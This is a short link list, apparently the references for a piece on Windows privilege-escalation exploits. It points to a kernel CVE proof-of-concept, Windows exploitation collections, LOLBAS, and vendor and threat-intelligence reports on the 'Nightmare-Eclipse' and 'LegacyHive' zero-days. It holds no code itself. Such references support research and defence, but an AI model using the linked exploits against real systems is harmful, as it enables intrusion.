- CVE-2025-62215 PoC: <https://github.com/abrewer251/CVE-2025-62215_Windows_Kernel_PE>
- awesome_windows_logical_bugs: <https://github.com/sailay1996/awesome_windows_logical_bugs>
- LOLBAS: <https://lolbas-project.github.io/>
- WADComs: <https://wadcoms.github.io/>
- Decoder blog (Token Kidnapping): <https://decoder.cloud/>
- Awesome Advanced Windows Exploitation: <https://github.com/yeyintminthuhtut/Awesome-Advanced-Windows-Exploitation-References>
- Barracuda threat research on Nightmare-Eclipse: <https://blog.barracuda.com/2026/05/19/nightmare-eclipse-zero-days-grudge>
- Huntress intrusion report: <https://www.huntress.com/blog/nightmare-eclipse-intrusion>
- SecurityOnline LegacyHive: <https://securityonline.info/legacyhive-windows-exploit/>
- CyberSecurityNews LegacyHive: <https://cybersecuritynews.com/legacyhive-windows-0-day-vulnerability/>
- DeepWiki BlueHammer analysis: <https://deepwiki.com/Nightmare-Eclipse/BlueHammer>
- AlienVault OTX pulse: <https://otx.alienvault.com/pulse/69e68c661e82c96759b91265>
- Microsoft CVE-2026-33825 advisory: <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825>
